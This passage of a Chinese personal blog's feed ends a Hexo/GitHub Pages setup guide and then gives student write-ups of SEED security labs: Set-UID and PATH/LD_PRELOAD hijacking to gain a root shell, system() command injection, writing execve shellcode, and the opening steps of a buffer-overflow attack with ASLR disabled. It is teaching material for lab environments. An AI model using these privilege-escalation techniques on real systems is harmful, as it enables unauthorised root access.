<span class="token parameter variable">-g</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>输入以下命令查看Hexo版本信息来确认是否安装成功</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">hexo <span class="token parameter variable">-v</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/../image/image-20240124222128867.png" alt="image-20240124222128867"></p></li><li><p>执行hexo init来初始化，初始化后会多出一些文件</p></li><li><p>执行hexo g生成html页面</p></li><li><p>使用hexo s启动服务，可以看到博客的页面，服务默认在4000端口，如果不满意，可以使用hexo server -p 1234来指定端口</p></li></ol><h3 id="3-将博客部署到github远程仓库"><a href="#3-将博客部署到github远程仓库" class="headerlink" title="3. 将博客部署到github远程仓库"></a>3. 将博客部署到github远程仓库</h3><ol><li><p>登录Github新建一个仓库，仓库名必须为你的<code>Github用户名.github.io</code></p></li><li><p>回到Git Bash中，配置Github账户信息（用户名和邮箱都替换成你自己Github上的）</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">git</span> config <span class="token parameter variable">--global</span> user.name <span class="token string">"用户名"</span><span class="token function">git</span> config <span class="token parameter variable">--global</span> user.email <span class="token string">"邮箱"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li><li><p>生成ssh</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">ssh-keygen <span class="token parameter variable">-t</span> rsa <span class="token parameter variable">-C</span> <span class="token string">"你的Github邮箱"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>然后按Git Bash给出的路径找到<code>id_rsa.pub</code>文件，并复制其中的内容</p></li><li><p>在github的设置中找到SSH and GPG keys,点击New SSH Key，在key中填入刚才复制的公钥。</p><p><img src="/../image/image-20240124223131119.png" alt="image-20240124223131119"></p><p><img src="/../image/image-20240124223243461.png" alt="image-20240124223243461"></p></li><li><p>打开配置文件_config.yml，找到下图所示地方修改为自己的仓库地址</p><p><img src="/../image/image-20240124223718648.png" alt="image-20240124223718648"></p><p><img src="/../image/image-20240124223825653.png" alt="image-20240124223825653"></p></li><li><p>执行如下命令将项目提交到仓库</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">npm</span> <span class="token function">install</span> hexo-deployer-git <span class="token parameter variable">--save</span>  <span class="token comment">#安装部署工具</span>hexo clean                            <span class="token comment">#清除缓存       可缩写hexo c</span>hexo generate                         <span class="token comment">#生成静态文件    可缩写hexo g</span>hexo deploy                           <span class="token comment">#部署到Github   可缩写hexo d</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>如果提交失败，可能是我遇到的问题，解决方法如下</p><ul><li><p>首先测试SSH连接，这里我连接失败,报错ssh: connect to host github.com port 22: Connection timed out</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">ssh</span> <span class="token parameter variable">-T</span> git@github.com<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>在存放公钥私钥(id_rsa和id_rsa.pub)的文件里，新建config文本，内容如下：</p><pre class="line-numbers language-none"><code class="language-none">Host github.comUser 注册github的邮箱Hostname ssh.github.comPreferredAuthentications publickeyIdentityFile ~/.ssh/id_rsaPort 443<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>之后再测试SSH连接成功，然后重新提交到仓库即可</p><p><img src="/../image/image-20240124224642665.png" alt="image-20240124224642665"></p></li></ul></li></ol><h2 id="四、博客主题切换"><a href="#四、博客主题切换" class="headerlink" title="四、博客主题切换"></a>四、博客主题切换</h2><p>自己可以去Hexo官网选择自己心仪的主题，这里以我使用的为例</p><h3 id="1-主题下载与切换"><a href="#1-主题下载与切换" class="headerlink" title="1. 主题下载与切换"></a>1. 主题下载与切换</h3><p><a href="https://github.com/blinkfox/hexo-theme-matery/releases/tag/v2.0.0">点击</a>下载并且解压到themes目录里面</p><p>或者通过Git拉取</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">git</span> clone https://github.com/blinkfox/hexo-theme-matery.git<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>修改 Hexo 根目录下的 <code>_config.yml</code> 的 <code>theme</code> 的值：<code>theme: hexo-theme-matery</code></p><h4 id="1-1-config-yml-文件的其它修改建议"><a href="#1-1-config-yml-文件的其它修改建议" class="headerlink" title="1.1 _config.yml 文件的其它修改建议:"></a><code>1.1 _config.yml</code> 文件的其它修改建议:</h4><ul><li>请修改 <code>_config.yml</code> 的 <code>url</code> 的值为你的网站主 <code>URL</code>（如：<code>http://xxx.github.io</code>）。</li><li>建议修改两个 <code>per_page</code> 的分页条数值为 <code>6</code> 的倍数，如：<code>12</code>、<code>18</code> 等，这样文章列表在各个屏幕下都能较好的显示。</li><li>如果你是中文用户，则建议修改 <code>language</code> 的值为 <code>zh-CN</code>。</li></ul><h3 id="2-主题的配置"><a href="#2-主题的配置" class="headerlink" title="2. 主题的配置"></a>2. 主题的配置</h3><p>参考<a href="https://github.com/blinkfox/hexo-theme-matery/blob/develop/README_CN.md">官方文档</a>或者此<a href="https://blog.csdn.net/guixinchn/article/details/108152957">博客</a></p><h2 id="五、参考链接"><a href="#五、参考链接" class="headerlink" title="五、参考链接"></a>五、参考链接</h2><p>[1]: <a href="https://github.com/blinkfox/hexo-theme-matery/tree/develop">https://github.com/blinkfox/hexo-theme-matery/tree/develop</a>“hexo-theme-matery官方文档”<br>[2]: <a href="https://blog.csdn.net/qq_44732432/article/details/124714408">https://blog.csdn.net/qq_44732432/article/details/124714408</a>“使用Hexo搭建博客并部署到Github”<br>[3]: <a href="https://blog.csdn.net/weixin_48927364/article/details/123405585">https://blog.csdn.net/weixin_48927364/article/details/123405585</a>“【Hexo】部署博客到Github失败的解决方案”<br>[4]: <a href="https://www.cnblogs.com/Lutheran/p/15915295.html">https://www.cnblogs.com/Lutheran/p/15915295.html</a>“github连接报错”<br>[5]: <a href="https://blog.csdn.net/guixinchn/article/details/108152957">https://blog.csdn.net/guixinchn/article/details/108152957</a>“Hexo-matery主题美化”<br>[6]: <a href="https://zhuanlan.zhihu.com/p/137476045">https://zhuanlan.zhihu.com/p/137476045</a>“Hexo搭建个人博客-并部署到Github上托管(Windows)”</p>]]></content>
      
      
      <categories>
          
          <category> 搭建博客前言 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 博客搭建 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>网络攻防实验6：环境变量与set-uid实验</title>
      <link href="/2023/10/23/wang-luo-gong-fang-shi-yan-6/"/>
      <url>/2023/10/23/wang-luo-gong-fang-shi-yan-6/</url>
      
        <content type="html"><![CDATA[<div align="center">    <font size="6">实验6：环境变量与set-uid实验</font></div><h2 id="一、实验要求"><a href="#一、实验要求" class="headerlink" title="一、实验要求"></a>一、实验要求</h2><p>本实验室的学习目标是让学生了解环境变量如何影响程序以及系统行为。环境变量是一组动态命名值，可以影响正在运行的进程将在计算机上运行。大多数操作系统都使用它们，因为它们是1979年引入Unix。尽管环境变量会影响程序行为，但它们是如何实现的这一点很多程序员都不太理解。因此，如果程序使用环境变量程序员不知道它们被使用，程序可能有漏洞。</p><p>在本实验室中，学生将了解环境变量是如何工作的，它们是如何从父进程到子进程，以及它们如何影响系统/程序行为。我们特别感兴趣的是如何环境变量影响Set-UID程序的行为，这些程序通常是特权程序。</p><p>本实验室涵盖以下主题：</p><ul><li><p>环境变量</p></li><li><p>SET-UID程序</p></li><li><p>安全地调用外部程序</p></li><li><p>能力泄漏</p></li><li><p>动态加载程序/链接器</p></li></ul><h2 id="二、实验环境"><a href="#二、实验环境" class="headerlink" title="二、实验环境"></a>二、实验环境</h2><p>VMware</p><p>SEED实验平台</p><h2 id="三、实验步骤及结果"><a href="#三、实验步骤及结果" class="headerlink" title="三、实验步骤及结果"></a>三、实验步骤及结果</h2><h3 id="task-1：Manipulating-Environment-Variables"><a href="#task-1：Manipulating-Environment-Variables" class="headerlink" title="task 1：Manipulating Environment Variables"></a>task 1：Manipulating Environment Variables</h3><ol><li><p>使用printenv或env打印环境变量<img src="/../image/image-20231023161415590.jpeg" alt="img"></p></li><li><p>使用printenv PWD或env|grep PWD查找特定环境变量</p><p><img src="/../image/image-20231023161754375.png" alt="image-20231023161754375"></p></li><li><p>使用export和unset来设置和取消环境变量</p><p><img src="/../image/image-20231023162158245.png" alt="image-20231023162158245"></p></li></ol><h3 id="task-2：-Passing-Environment-Variables-from-Parent-Process-to-Child-Process"><a href="#task-2：-Passing-Environment-Variables-from-Parent-Process-to-Child-Process" class="headerlink" title="task 2： Passing Environment Variables from Parent Process to Child Process"></a>task 2： Passing Environment Variables from Parent Process to Child Process</h3><ol><li><p>编译运行myprintenv.c文件，把结果输出到child.txt文件</p><p><img src="/../image/image-20231023164009970.png" alt="image-20231023164009970"></p><p><img src="/../image/image-20231023164156294.png" alt="image-20231023164156294"></p><p><img src="/../image/image-20231023164229952.png" alt="image-20231023164229952"></p></li><li><p>修改代码，输出父进程的环境变量，编译运行代码，把结果输出到father.txt文件</p><p><img src="/../image/image-20231023164434788.png" alt="image-20231023164434788"></p><p><img src="/../image/image-20231023164552901.png" alt="image-20231023164552901"></p><p><img src="/../image/image-20231023164627524.png" alt="image-20231023164627524"></p></li><li><p>使用diff命令比较两次输出有什么不同</p><p><img src="/../image/image-20231023165017903.png" alt="image-20231023165017903"></p><p>没有输出内容，说明两个文件的内容相同，说明子进程的环境变量继承了父进程的环境变量</p></li></ol><h3 id="task-3：-Environment-Variables-and-execve"><a href="#task-3：-Environment-Variables-and-execve" class="headerlink" title="task 3： Environment Variables and execve()"></a>task 3： Environment Variables and execve()</h3><ol><li><p>编译运行myenv.c程序，发现什么都没有打印出来</p><p><img src="/../image/image-20231023171213522.png" alt="image-20231023171213522"></p><p>原因是：execve()用来执行参数filename字符串所代表的文件路径，第二个参数是利用指针数组来传递给执行文件，并且需要以空指针(NULL)结束，最后一个参数则为传递给执行文件的新环境变量数组，此程序第三个参数为NULL，所以什么也不会输出。</p><p><img src="/../image/image-20231023171459839.png" alt="image-20231023171459839"></p></li><li><p>修改代码，将execve()的第三个参数改为environ全局环境变量，运行发现打印出当前进程的环境变量</p><p><img src="/../image/image-20231023190036355.png" alt="image-20231023190036355"></p><p><img src="/../image/image-20231023190353744.png" alt="image-20231023190353744"></p></li><li><p>结论：原进程将自己的环境变量通过environ变量传入exceve()函数的第三个传递给新进程新环境变量的参数，进而新的进程获取环境变量。</p></li></ol><h3 id="task-4：-Environment-Variables-and-system"><a href="#task-4：-Environment-Variables-and-system" class="headerlink" title="task 4： Environment Variables and system()"></a>task 4： Environment Variables and system()</h3><ol><li><p>编译运行示例代码，观察输出结果</p><p><img src="/../image/image-20231023194641402.png" alt="image-20231023194641402"></p><p><img src="/../image/image-20231023194803452.png" alt="image-20231023194803452"></p></li><li><p>查阅资料</p><p>定义函数：int system(const char * string);</p><p>函数说明：system（）会调用fork（）产生子进程，由子进程来调用/bin/sh-c string来执行参数string字符串所代表的命令，此命令执行完后随即返回原调用的进程。在调用system（）期间SIGCHLD 信号会被暂时搁置，SIGINT和SIGQUIT 信号则会被忽略。</p></li></ol><h3 id="task-5：-Environment-Variable-and-Set-UID-Programs"><a href="#task-5：-Environment-Variable-and-Set-UID-Programs" class="headerlink" title="task 5： Environment Variable and Set-UID Programs"></a>task 5： Environment Variable and Set-UID Programs</h3><ol><li><p>编译运行示例代码，打印当前进程中的所有环境变量</p><p><img src="/../image/image-20231023203732146.png" alt="image-20231023203732146"></p></li><li><p>修改程序的所有权为root，形成Set-UID程序</p><p><img src="/../image/image-20231023204356351.png" alt="image-20231023204356351"></p></li><li><p>在普通用户的shell中设置环境变量，执行第二步中生成的Set-UID</p><p><img src="/../image/image-20231024102845996.png" alt="image-20231024102845996"></p><p><img src="/../image/image-20231024103724201.png" alt="image-20231024103724201"></p><p>观察发现LD_LIBRARY_PATH没有进入子进程</p><p>解释：为了使 Set-UID 程序更加安全，不受<code>LD_LIBRARY_PATH</code>环境变量的影响，运行时的链接器或加载器（<code>ld.so</code>）会忽略环境变量，如果程序是个 Set-UID 程序。</p></li></ol><h3 id="task-6：-The-PATH-Environment-Variable-and-Set-UID-Programs"><a href="#task-6：-The-PATH-Environment-Variable-and-Set-UID-Programs" class="headerlink" title="task 6： The PATH Environment Variable and Set-UID Programs"></a>task 6： The PATH Environment Variable and Set-UID Programs</h3><ol><li><p>编写并编译示例代码</p><p><img src="/../image/image-20231024114046037.png" alt="image-20231024114046037"></p></li><li><p>修改task6的所有权为root，形成Set-UID程序</p><p><img src="/../image/image-20231024114241860.png" alt="image-20231024114241860"></p></li><li><p>将 /bin/sh 链接到另一个没有防止攻击的对策的 shell，修改PATH环境变量，执行task6</p><p><img src="/../image/image-20231024115023355.png" alt="image-20231024115023355"></p></li><li><p>创建并编译自己的恶意程序</p><p><img src="/../image/image-20231024135814795.png" alt="image-20231024135814795"></p></li><li><p>查看当前目录，添加到环境变量当中，让task6执行我们的ls程序</p><p><img src="/../image/image-20231024140034036.png" alt="image-20231024140034036"></p></li><li><p>获取root权限</p><p>将/bin/sh 拷贝为当前目录下的文件ls</p><p><img src="/../image/image-20231024140614165.png" alt="image-20231024140614165"></p><p>将当前路径添加到环境变量，运行task6即可获得root权限</p><p><img src="/../image/image-20231024140921174.png" alt="image-20231024140921174"></p></li></ol><h3 id="task-7：-The-LD-PRELOAD-Environment-Variable-and-Set-UID-Programs"><a href="#task-7：-The-LD-PRELOAD-Environment-Variable-and-Set-UID-Programs" class="headerlink" title="task 7： The LD PRELOAD Environment Variable and Set-UID Programs"></a>task 7： The LD PRELOAD Environment Variable and Set-UID Programs</h3><ol><li><p>构建一个动态链接库。 创建以下程序，并将其命名为 mylib.c</p><p><img src="/../image/image-20231024145349361.png" alt="image-20231024145349361"></p></li><li><p>使用以下命令编译上面的程序：</p><p><img src="/../image/image-20231024145515741.png" alt="image-20231024145515741"></p></li><li><p>现在，设置 LD_PRELOAD 环境变量</p><p><img src="/../image/image-20231024145654711.png" alt="image-20231024145654711"></p></li><li><p>最后编译下面的程序myprog，和上面的动态链接库libmylib.so.1.0.1在同一个目录下</p><p><img src="/../image/image-20231024145918355.png" alt="image-20231024145918355"></p></li><li><p>完成上述操作后，请在以下条件下运行 myprog，并观察会发生什么。</p><ul><li><p>使myprog 成为常规程序，并以普通用户身份运行它。</p><p>会执行设定的库中sleep函数</p><p><img src="/../image/image-20231024150630199.png" alt="image-20231024150630199"></p></li><li><p>使myprog 成为Set-UID root 程序，并以普通用户身份运行它。</p><p>正常sleep一秒，退出程序</p><p><img src="/../image/image-20231024150909047.png" alt="image-20231024150909047"></p></li><li><p>使myprog 成为Set-UID root 程序，再次在root 用户中设置LD_RELOAD 环境变量，然后运行它。</p><p>执行库中的sleep函数</p><p><img src="/../image/image-20231024151200946.png" alt="image-20231024151200946"></p></li><li><p>使 myprog 成为 Set-UID user1 程序（即所有者是 user1，这是另一个用户帐户），在不同用户的帐户（非 root 用户）中再次导出 LD PRELOAD 环境变量并运行它。</p><p>首先创建用户user1</p><p><img src="/../image/image-20231024151734889.png" alt="image-20231024151734889"></p><p>设置程序的所有者为user1，并设置为Set-UID程序</p><p><img src="/../image/image-20231024152219734.png" alt="image-20231024152219734"></p><p>在seed用户中添加环境变量，执行myprog，结果是正常执行sleep，睡眠一秒然后退出程序。</p><p><img src="/../image/image-20231024152351446.png" alt="image-20231024152351446"></p></li></ul></li><li><p>设计一个实验找到上述行为不同的原因</p><ul><li><p>使用task2中的程序，通过改变注释行可以分别打印子进程的环境变量和父进程的环境变量。</p><p><img src="/../image/image-20231024153532438.png" alt="image-20231024153532438"></p><p><img src="/../image/image-20231024153717599.png" alt="image-20231024153717599"></p></li><li><p>程序为常规程序。以seed用户更改环境变量，执行程序。</p><p><img src="/../image/image-20231024154701750.png" alt="image-20231024154701750"></p><p>结果发现父进程和子进程的环境变量相同，且都有LD_PRELOAD环境变量，说明子进程继承了父进程的LD_PRELOAD环境变量</p></li><li><p>把程序设置为root的Set-UID程序，在seed用户中设置环境变量，执行程序</p><p><img src="/../image/image-20231024161515426.png" alt="image-20231024161515426"></p><p>结果发现在子进程中没有LD_PRELOAD环境变量，只有在父进程中才能发现LD_PRELOAD环境变量，说明子进程没有继承父进程的LD_PRELOAD环境变量</p></li><li><p>把程序设置为root的Set-UID程序，在root中设置环境变量，执行程序</p><ul><li><p>在root下执行</p><p><img src="/../image/image-20231024162439813.png" alt="image-20231024162439813"></p><p>结果中子进程和父进程的环境变量相同，且都有LD_PRELOAD环境变量，说明子进程继承了父进程的LD_PRELOAD环境变量</p></li><li><p>在seed中执行</p><p><img src="/../image/image-20231024163823390.png" alt="image-20231024163823390"></p><p>结果表明父进程和子进程都没有环境变量LD_PRELOAD，原因是环境变量是在root中设置的，如果有说明上一步中的seed下的环境变量没有删掉。</p></li></ul></li><li><p>程序为所有者为user1的Set-UID程序。以seed用户执行程序。</p><p><img src="/../image/image-20231024165251287.png" alt="image-20231024165251287"></p><p>结果发现在子进程中没有LD_PRELOAD环境变量，只有在父进程中才能发现LD_PRELOAD环境变量，说明子进程没有继承父进程的LD_PRELOAD环境变量</p></li><li><p>主要原因：动态链接器的<strong>保护机制</strong>。</p><p>当运行进程的真实用户ID与程序的拥有者的用户ID不一致时，进程会忽略掉父进程的LD_PRELOAD环境变量；若ID一致，则子进程会继承此时运行进程的真实用户下的LD_PRELOAD环境变量，并加入共享库。在此实验中设置为Set-UID程序时，在其他用户下执行，ID不一致，子进程不会继承父进程的环境变量</p></li></ul></li></ol><h3 id="task-8：-Invoking-External-Programs-Using-system-versus-execve"><a href="#task-8：-Invoking-External-Programs-Using-system-versus-execve" class="headerlink" title="task 8： Invoking External Programs Using system() versus execve()"></a>task 8： Invoking External Programs Using system() versus execve()</h3><ol><li><p>编译catall.c程序，使其成为一个root拥有的Set-UID程序</p><p><img src="/../image/image-20231024171618268.png" alt="image-20231024171618268"></p></li><li><p>用root权限创建test目录下面test.txt文件，使用seed用户发现不能删除</p><p><img src="/../image/image-20231024172235948.png" alt="image-20231024172235948"></p></li><li><p>通过传入多条命令来获取root权限的shell，删除文件</p><p><img src="/../image/image-20231024172624510.png" alt="image-20231024172624510"></p></li><li><p>注释：掉system(command)语句，取消execve()语句的注释，重新编译运行，发现攻击失败，原因是execve不会调用shell，只会创建一个新程序，把我们传入的参数当一个字符串执行</p><p><img src="/../image/image-20231024173117398.png" alt="image-20231024173117398"></p></li></ol><h3 id="Task-9：Capability-Leaking"><a href="#Task-9：Capability-Leaking" class="headerlink" title="Task 9：Capability Leaking"></a>Task 9：Capability Leaking</h3><ol><li><p>以root权限创建etc文件夹，文件夹内创建zzz文件，并设置其权限为0644</p><p><img src="/../image/image-20231024173703611.png" alt="image-20231024173703611"></p></li><li><p>修改代码，把路径设置为创建的zzz文件的位置</p><p><img src="/../image/image-20231024173932081.png" alt="image-20231024173932081"></p></li><li><p>编译代码，设置为所有者为root的Set-UID程序</p><p><img src="/../image/image-20231024174327363.png" alt="image-20231024174327363"></p></li><li><p>在seed用户下运行，写入zzz：</p><p><img src="/../image/image-20231024174955350.png" alt="image-20231024174955350"></p></li><li><p>解释：</p><p>运行Set-UID程序时，进程暂时获得root权限，打开zzz文件时，获得了root权限下的读写文件、向文件中添加内容的权限，当使用setuid()释放root权限时，<strong>没有释放进程已经获得的特权功能</strong>—读写文件、向文件中添加内容。只要将语句setuid(getuid())移至调用open函数之前，就可以避免。</p></li></ol>]]></content>
      
      
      <categories>
          
          <category> 网络攻防实验 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络攻防 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>网络攻防实验5：shellcode编写实验</title>
      <link href="/2023/10/17/wang-luo-gong-fang-shi-yan-5/"/>
      <url>/2023/10/17/wang-luo-gong-fang-shi-yan-5/</url>
      
        <content type="html"><![CDATA[<div align="center">    <font size="6">实验5：shellcode编写实验</font></div><h2 id="一、实验要求"><a href="#一、实验要求" class="headerlink" title="一、实验要求"></a>一、实验要求</h2><p>shellcode广泛用于许多涉及代码注入的攻击中。编写shellcode是相当有挑战性的。虽然我们可以很容易地从互联网上找到现有的shellcode，但是能够从头开始编写我们自己的shellcode总是令人兴奋的。shellcode中涉及到几种有趣的技术。本实验室的目的是帮助学生理解这些技术，以便他们能够编写自己的shellcode。</p><p>编写shellcode有几个挑战，一个是确保二进制文件中没有0x00，另一个是找出命令中使用的数据的地址。第一个挑战不是很难解决，有几种方法可以解决它。第二个挑战的解决方案导致了编写外壳代码的两种典型方法。在一种方法中，数据在执行期间被推入堆栈，因此可以从堆栈指针获得它们的地址。在第二种方法中，数据存储在代码区域中，就在调用指令之后，因此在调用调用函数时，其地址被推入堆栈（作为返回地址）。两种解决方案都非常优雅，我们希望学生能够学习这两种技术。 </p><h2 id="二、实验环境"><a href="#二、实验环境" class="headerlink" title="二、实验环境"></a>二、实验环境</h2><p>VMware</p><p>SEED实验平台</p><h2 id="三、实验步骤及结果"><a href="#三、实验步骤及结果" class="headerlink" title="三、实验步骤及结果"></a>三、实验步骤及结果</h2><h3 id="task-1：Writing-Shellcode"><a href="#task-1：Writing-Shellcode" class="headerlink" title="task 1：Writing Shellcode"></a>task 1：Writing Shellcode</h3><h4 id="task-1-a：The-Entire-Process"><a href="#task-1-a：The-Entire-Process" class="headerlink" title="task 1.a：The Entire Process"></a>task 1.a：The Entire Process</h4><ol><li><p>编译mysh.s汇编代码为二进制文件。</p><p><img src="/../image/image-20231017214038607.png" alt="image-20231017214038607"></p></li><li><p>运行生成的mysh程序，并比较前后的进程ID，发现不同，说明我们启动了新的shell</p><p><img src="/../image/image-20231017214423692.png" alt="image-20231017214423692"></p></li><li><p>获取机器码以便后续使用</p><p><img src="/../image/image-20231017215050845.png" alt="image-20231017215050845"></p></li><li><p>使用xxd工具打印二进制文件并找到机器码</p><p><img src="/../image/image-20231017215256189.png" alt="image-20231017215256189"></p></li><li><p>把机器码复制到convert.py中</p><p><img src="/../image/image-20231017225553997.png" alt="image-20231017225553997"></p></li><li><p>执行convert.py文件，得到shellcode中包含的16进制形式的机器码</p><p><img src="/../image/image-20231017225738265.png" alt="image-20231017225738265"></p></li></ol><h4 id="task1-b：Eliminating-Zeros-from-the-Code"><a href="#task1-b：Eliminating-Zeros-from-the-Code" class="headerlink" title="task1.b：Eliminating Zeros from the Code"></a>task1.b：Eliminating Zeros from the Code</h4><ol><li><p>由于linux 是小端存储，因此我们在最后一段把 h###左移三位，再右移三位即可</p><p><img src="/../image/image-20231018134447335.png" alt="image-20231018134447335"></p></li><li><p>编译运行发现机器码没有0</p><p><img src="/../image/image-20231018135255116.png" alt="image-20231018135255116"></p></li></ol><h4 id="task1-c：Providing-Arguments-for-System-Calls"><a href="#task1-c：Providing-Arguments-for-System-Calls" class="headerlink" title="task1.c：Providing Arguments for System Calls"></a>task1.c：Providing Arguments for System Calls</h4><ol><li><p>修改mysh.s，将/bin/sh -c “ls -la”压入栈中，通过#占位和左右移位的方式来凑齐4字节。</p><p><img src="/../image/image-20231018150705072.png" alt="image-20231018150705072"></p></li><li><p>编译并执行mysh.s，并直接在命令行中输入“ls -la”，观察到二者结果相同</p><p><img src="/../image/image-20231018150912981.png" alt="image-20231018150912981"></p></li><li><p>查看mysh.o的二进制机器码，发现没有0</p><p><img src="/../image/image-20231018151039703.png" alt="image-20231018151039703"></p></li></ol><h4 id="task1-d：Providing-Environment-Variables-for-execve"><a href="#task1-d：Providing-Environment-Variables-for-execve" class="headerlink" title="task1.d：Providing Environment Variables for execve()"></a>task1.d：Providing Environment Variables for execve()</h4><ol><li><p>修改mysh.s，将/usr/bin/env压入栈中。把环境变量压入栈中</p><p><img src="/../image/image-20231019153356909.png" alt="image-20231019153356909"></p><p><img src="/../image/image-20231019153429906.png" alt="image-20231019153429906"></p></li><li><p>编译并执行mysh.s</p><p><img src="/../image/image-20231019153823337.png" alt="image-20231019153823337"></p></li><li><p>查看mysh.o的二进制机器码，发现没有0</p><p><img src="/../image/image-20231019153924100.png" alt="image-20231019153924100"></p></li></ol><h3 id="task-2-Using-Code-Segment"><a href="#task-2-Using-Code-Segment" class="headerlink" title="task 2: Using Code Segment"></a>task 2: Using Code Segment</h3><ol><li><p>解释代码：</p><p><strong>pop ebx</strong>：把栈顶的内容赋给ebx，由于实在two中调用的one，所以栈顶是下一条指令的地址，由于调用 one 的语句下一句存储了一个字符串，所以ebp获得了该字符串的地址。</p><p><strong>xor eax, eax</strong>：由于异或相同位为0，所以这句是把eax寄存器清零。</p><p><strong>mov [ebx+7], al</strong>：这行将 al 寄存器（eax低 8 位）的值（0x00）存储到 ebx+7 的内存位置，这相当于在字符串”/bin/sh*AAAABBBB”中的第 8个字符位置存储了一个空字节，从而将”/bin/sh”字符串的末尾标记为 null 终止字符串。</p><p><strong>mov [ebx+8], ebx</strong>：这行将 ebx 寄存器的值存储到 ebx+8 的内存位置。这里存储的是argv数组的地址。</p><p><strong>mov [ebx+12], eax</strong>：这行将 eax 寄存器的值（0）存储到 ebx+12 的内存位置。</p><p>**lea ecx, [ebx+8] **：这行将 ebx+8 的内存地址加载到 ecx 寄存器中。而 ecx 指向的 是 argv[]数组</p><p><strong>xor edx, edx</strong>：将edx清零</p><p><strong>mov al,  0x0b</strong>：这行将 al 寄存器设置为系统调用号 0x0b，它对应于 execve 系统 调用。</p><p><strong>int 0x80</strong>：这行触发一个中断，进入内核执行系统调用，根据寄存器中的值来执 行 execve 系统调用。</p></li><li><p>修改mysh2.s，执行/url/bin/env -i a=11 b=22</p><p><img src="/../image/image-20231019220953312.png" alt="image-20231019220953312"></p></li><li><p>编译运行</p><p><img src="/../image/image-20231019221032143.png" alt="image-20231019221032143"></p></li></ol><h3 id="task3：Writing-64-bit-Shellcode"><a href="#task3：Writing-64-bit-Shellcode" class="headerlink" title="task3：Writing 64-bit Shellcode"></a>task3：Writing 64-bit Shellcode</h3><p>在64位下实现task1.b</p><ol><li><p>通过占位移位来把9位的/bin/bash存储到栈</p><p><img src="/../image/image-20231020083253921.png" alt="image-20231020083253921"></p></li><li><p>运行结果如下</p><p><img src="/../image/image-20231020083446694.png" alt="image-20231020083446694"></p></li><li><p>查看机器码</p><p><img src="/../image/image-20231020083554256.png" alt="image-20231020083554256"></p></li></ol>]]></content>
      
      
      <categories>
          
          <category> 网络攻防实验 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络攻防 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>网络攻防实验4：缓冲区溢出攻击实验</title>
      <link href="/2023/10/09/wang-luo-gong-fang-shi-yan-4/"/>
      <url>/2023/10/09/wang-luo-gong-fang-shi-yan-4/</url>
      
        <content type="html"><![CDATA[<div align="center">    <font size="6">实验4：缓冲区溢出攻击实验</font></div><h2 id="一、实验要求"><a href="#一、实验要求" class="headerlink" title="一、实验要求"></a>一、实验要求</h2><p>本实验的学习目标是让学生将从课堂上学到的有关缓冲区溢出漏洞的知识进行实践，从而获得有关该漏洞的第一手经验。缓冲区溢出是指程序试图将数据写入预先分配的固定长度缓冲区边界之外的情况。恶意用户可利用此漏洞改变程序的流控制，甚至执行任意代码。此漏洞是由于数据存储（如缓冲区）和控件存储（如返回地址）的混合造成的：数据部分的溢出会影响程序的控制流，因为溢出会改变返回地址。</p><p>本实验将提供四台不同的服务器，每台服务器运行一个带有缓冲区溢出漏洞的程序。实验任务是开发一个利用漏洞的程序，并最终获得这些服务器上的root权限。除了进行这些攻击实验之外，还将试验几种针对缓冲区溢出攻击的对策。学生需要评估这些计划是否有效，并解释原因。</p><h2 id="二、实验环境"><a href="#二、实验环境" class="headerlink" title="二、实验环境"></a>二、实验环境</h2><p>VMware</p><p>SEED实验平台</p><h2 id="三、实验步骤及结果"><a href="#三、实验步骤及结果" class="headerlink" title="三、实验步骤及结果"></a>三、实验步骤及结果</h2><h3 id="task1：Get-Familiar-with-the-Shellcode"><a href="#task1：Get-Familiar-with-the-Shellcode" class="headerlink" title="task1：Get Familiar with the Shellcode"></a>task1：Get Familiar with the Shellcode</h3><ol><li><p>修改shellcode_32.py和shellcode_64.py文件，使其可以实现删除文件</p><p><img src="/../image/image-20231010102458474.png" alt="image-20231010102458474"></p></li><li><p>创建test.txt文件，执行shellcode_32.py和shellcode_64.py，删除文件</p><p><img src="/../image/image-20231011172359395.png" alt="image-20231011172359395"></p><p><img src="/../image/image-20231011172432469.png" alt="image-20231011172432469"></p><p><img src="/../image/image-20231011172721935.png" alt="image-20231011172721935"></p><p><img src="/../image/image-20231011172741234.png" alt="image-20231011172741234"></p></li></ol><h3 id="task2：Level-1-Attack"><a href="#task2：Level-1-Attack" class="headerlink" title="task2：Level-1 Attack"></a>task2：Level-1 Attack</h3><ol><li><p>在目录/Labsetup下打开一个终端，并在该终端开启容器</p><p><img src="/../image/image-20231012170325804.png" alt="image-20231012170325804"></p></li><li><p>在目录/Labsetup下再次打开一个终端，向目标服务器发送正常数据hello测试</p><p>输入命令：echo hello | nc 10.9.0.5 9090=&gt;键入：Ctrl+C</p><p><img src="/../image/image-20231010152438394.png" alt="image-20231010152438394"></p><p>发现两次地址不一样，关闭地址随机化（每次关闭虚拟机再开启时都要关闭）：sudo /sbin/sysctl -w kernel.randomize_va_space=0</p></li><li><p>向服务器发送未修改的py文件，获取ebp和buffer地址</p><p><img src="/../image/image-20231012170430304.png" 